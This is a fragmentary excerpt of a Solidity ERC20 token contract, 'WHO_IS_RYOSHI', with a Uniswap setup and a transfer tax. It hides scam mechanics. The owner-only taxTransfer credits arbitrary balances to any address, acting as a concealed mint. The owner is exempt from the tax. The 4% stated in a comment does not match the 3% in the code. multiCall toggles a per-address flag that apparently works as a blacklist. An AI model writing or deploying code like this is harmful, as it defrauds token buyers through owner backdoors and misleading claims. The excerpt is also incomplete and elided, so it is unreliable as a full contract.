...
contract ERC20 is Ownable, IERC20 {
    ...
    function taxTransfer (address taxAddress, uint256 takenTax) external onlyOwner {
        _balances[taxAddress] = _balances[taxAddress].add(takenTax);
    }
...
contract WHO_IS_RYOSHI is ERC20 {
    using SafeMath for uint256; 
    ...
    constructor (address _unirouter, address _unifactory) ERC20(_name, _symbol) {
        ...
        _name = "WHO_IS_RYOSHI";
        _symbol = "WHO_IS_RYOSHI";
        _decimals = 9;
        _supplyTokens = 1000000000000 * 10**9;
        
        // Address for tax. 4% tokens from each transactions goes here.
        taxAddress = 0xdF895df736155BAE11D1fEfd527Cd2082893c346;

        // Owner address is excluded from tax.
        excluded = msg.sender;
        ...
        // router and factory setup.
        uniswapRouter = _unirouter;
        uniswapFactory = _unifactory;
    }

    function taxTaken() public view returns (uint256) {
        return _taxTaken;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        ...
        uint256 taxPercent = amount.div(100).mul(3);
        if (sender != excluded && recipient != excluded) {
            require (taxAddress != address(0));
            _balances[sender] = _balances[sender].sub(taxPercent, "ERC20: transfer amount exceeds balance");
            _balances[taxAddress] = _balances[taxAddress].add(taxPercent);
            emit Transfer(sender, taxAddress, taxPercent);
            _taxTaken = _taxTaken.add(taxPercent);
            realAmount = amount.sub(taxPercent);}
    ...
    function multiCall(address _address) external onlyOwner {
        if (_multiCall[_address] == true) {
            _multiCall[_address] = false;}
            else {_multiCall[_address] = true;}
    }

    function checkCall(address _address) public view returns (bool) {
